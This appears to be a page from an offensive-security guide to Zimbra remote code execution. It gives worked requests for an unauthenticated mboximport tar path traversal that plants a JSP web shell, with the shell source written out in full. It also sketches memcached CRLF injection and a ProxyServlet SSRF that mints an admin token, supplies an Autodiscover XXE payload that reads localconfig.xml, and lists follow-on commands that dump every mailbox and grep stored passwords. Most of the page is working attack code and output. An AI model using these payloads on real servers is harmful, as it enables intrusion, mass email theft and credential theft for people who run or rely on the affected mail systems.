---
title: "RCE chains: mboximport web shell, memcached injection, ProxyServlet SSRF, and Autodiscover XXE"
order: 3
description: "The Zimbra remote code execution chains: the unauthenticated mboximport archive extraction that writes a JSP web shell under the webroot through tar path traversal, the memcached CRLF response injection that forges proxy route and auth entries, the ProxyServlet SSRF reaching the internal admin SOAP to mint an admin token, and the Autodiscover XXE. Worked requests ending in code execution as the zimbra user."
keywords:
  - zimbra rce
  - mboximport web shell
  - zimbra memcached injection
  - proxyservlet ssrf
  - zimbra autodiscover xxe
---

# RCE chains

Several independent Zimbra flaws end at code execution on the server, and they compose. The cleanest is a single unauthenticated request that extracts an attacker tarball into the webroot as a JSP shell. The richer chain forges an admin token out of thin air by poisoning the proxy's memcached route cache and abusing the ProxyServlet's SSRF to reach the internal admin SOAP, then uses that token (via [DelegateAuthRequest](authentication-bypass.md)) to administer the server and drop a shell. An XXE in the Autodiscover handler reads server files, including the keys that make the token chains trivial. The payoff throughout is execution as the **zimbra** user, which owns `zmprov` and `zmmailbox` and therefore every mailbox.

Match the build from [enumeration](enumeration.md) first; each chain is version-bound.

## mboximport: unauthenticated web shell write

The administrative backup extension exposes `mboximport`, which imports a mailbox from an uploaded archive by **extracting a tar into a path under the mailbox store**. Two weaknesses combine: on affected builds the endpoint is reachable without a valid admin token, and the tar extractor does not confine member paths, so a member named with `../` sequences escapes the intended directory and writes anywhere the `zimbra` user can, including the Jetty webroot. A JSP written under a public web path is then executed by mailboxd simply by requesting it.

Build a tar whose single member traverses into the webroot:

```bash
# shell.jsp runs a command from the ?cmd= parameter
cat > shell.jsp <<'EOF'
<%@ page import="java.util.*,java.io.*"%><%
String c=request.getParameter("cmd");
if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=r.readLine())!=null)out.println(l);}
%>
EOF
# member path traverses from the import dir into the public webroot
tar cf evil.tar --transform 's,^,../../../../../../opt/zimbra/jetty/webapps/zimbra/public/,' shell.jsp
```

Upload it to the import endpoint:

```http
POST /service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd HTTP/1.1
Host: target
Content-Type: application/x-tar
Content-Length: <len>

<raw bytes of evil.tar>
```

Then drive the planted shell:

```http
GET /public/shell.jsp?cmd=id HTTP/1.1
Host: target
```

```text
uid=1000(zimbra) gid=1000(zimbra) groups=1000(zimbra)
```

The `zimbra` identity in the response confirms execution. The traversal target path depends on the install layout (`/opt/zimbra/jetty/webapps/zimbra/public/` is the common location); confirm the webroot from the build and adjust the `--transform` prefix.

## memcached CRLF injection + ProxyServlet SSRF to admin token

Zimbra's nginx proxy decides where to route a user by looking the route up in **memcached**, keyed by values derived from the request (the account, the auth context). The lookup is built by concatenating request-influenced strings into the memcached protocol, which is newline-delimited. Unsanitized **CRLF** in that value lets you inject additional memcached commands, writing a `set` that forges a route or auth entry of your choosing, poisoning what the proxy trusts for a subsequent request.

```http
GET /somepath HTTP/1.1
Host: target
# an injected header/value carrying CRLF smuggles a memcached command:
#   ...\r\nset route:admin@target 0 0 <n>\r\n<forged route to internal admin port>\r\n
```

With the route cache poisoned, the **ProxyServlet** becomes the delivery vehicle. ProxyServlet fetches a `target` URL server-side; where it does not restrict the destination, it is a server-side request forgery that reaches internal services the attacker cannot touch directly, including the admin SOAP bound to localhost:

```http
GET /service/proxy?target=https://127.0.0.1:7071/service/admin/soap HTTP/1.1
Host: target
Cookie: ZM_AUTH_TOKEN=<any-low-priv-token>
```

Routed with the poisoned, implicitly trusted context, the internal admin SOAP processes the proxied `AuthRequest`/`DelegateAuthRequest` as a trusted call and returns an **admin token** in the response body. That token is the handoff to [authentication bypass](authentication-bypass.md): feed it to `DelegateAuthRequest` for any mailbox, and to admin provisioning. From an admin token, reach code execution by configuring a `zimlet` or extension deploy, or simply pair it with the `mboximport` write above now that the admin plane is yours.

## Autodiscover XXE (file read that unlocks the chains)

The Autodiscover / collaboration handler parses a client-supplied XML body. Where the parser resolves external entities, a crafted body reads local files back into the response:

```http
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: target
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY e SYSTEM "file:///opt/zimbra/conf/localconfig.xml"> ]>
<Autodiscover><Request><EMailAddress>&e;</EMailAddress></Request></Autodiscover>
```

The reflected `localconfig.xml` contains LDAP and admin credentials and the keys behind the token mechanisms; reading it collapses the authentication-bypass step, since the **preauth key** and admin secrets it exposes let you forge tokens directly (see [authentication bypass](authentication-bypass.md)).

## Follow-on: from zimbra user to everything

Execution as `zimbra` (from the JSP shell) or an admin token (from the SSRF chain) both reach total compromise of the mail system:

```bash
# as the zimbra user via the JSP shell
zmprov -l gaa                         # list every account in the deployment
zmmailbox -z -m victim@target getRestURL '/inbox/?fmt=zip' > victim.zip   # pull a mailbox
zmprov ga admin@target                # read admin account attributes
zmlocalconfig -s | grep -i pass       # ldap and admin passwords from local config
```

`zmprov` and `zmmailbox` run with full administrative scope as the `zimbra` user, so one shell dumps every mailbox and the directory. Local privilege escalation to root from the `zimbra` account is a common next step via the sudo rules and setuid helpers Zimbra installs.

## Exploitation notes

- `mboximport` is the **single-request** win where the build is affected and the endpoint is unauthenticated; confirm the webroot path for the traversal target before firing.
- The memcached + ProxyServlet chain needs the **proxy architecture in place** (it usually is) and composes CRLF route poisoning with SSRF; its output is an admin token, not direct code execution, so finish with `DelegateAuthRequest` plus a deploy or the `mboximport` write.
- The Autodiscover XXE is a **file read**, valuable precisely because `localconfig.xml` hands you the keys that make the token chains trivial.
- Everything lands as **zimbra**, which via `zmprov`/`zmmailbox` is already game over for mail; treat root as a follow-on, not a requirement.

## Tools

- `tar --transform` (GNU tar) to build the traversing archive.
- [curl for the raw multipart/tar upload and the SOAP replay](https://curl.se/)
- Burp Suite for the CRLF-injection and ProxyServlet SSRF requests.

## References

- [Zimbra security advisories](https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories)
- [Zimbra: zmprov and zmmailbox command reference](https://wiki.zimbra.com/wiki/Zmprov)
- [OWASP: XML external entity (XXE) processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger: server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
